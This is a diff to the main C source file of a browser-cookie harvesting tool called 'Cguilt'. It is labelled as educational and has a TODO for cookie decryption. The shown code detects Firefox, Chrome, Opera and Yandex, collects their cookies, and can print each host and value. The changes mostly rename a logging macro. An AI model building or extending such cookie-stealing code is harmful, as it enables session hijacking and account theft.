@@ -1,9 +1,9 @@
 /*
-@
-    - Browser's cookies experiment field.
-    - Was written just in education pourpose.
-    ^ I personally don't like the previous version.
-@ 
+    @ Cguilt: main file.
+    @ Written and distributed just in education purpose.
+    @ Send bugreports: github.com/vulpes-solis/cguilt
+
+    @ TODO: cookies decryption.
 */
 
 #include "main.h"
@@ -23,7 +23,7 @@
 #endif
 #endif
 
-#define LOG_SHOW
+#define LOG_OFF
 
 
 /* Global cookies array and it's offset for callback.
@@ -64,8 +64,7 @@ int main(void)
     strcpy(local_machine.user_path, user_path);
 
 
-    #ifndef LOG_SHOW
-    /* Output status for test pourpose. */
+    #ifndef LOG_OFF
     printf("FF: %d\nCH: %d\nOP: %d\nYA: %d\n", 
         local_machine.FF, local_machine.CH,
         local_machine.OP, local_machine.YA);
@@ -76,8 +75,7 @@ int main(void)
     local_container = calloc(1, sizeof(cookies_datatype));
     collect_data(local_machine);
 
-    #ifndef LOG_SHOW
-    /* Just in case. */
+    #ifndef LOG_OFF
     for (int i = 0; i < offset; i++)
     {
         printf("[%d] host: %s, value: %s\n",
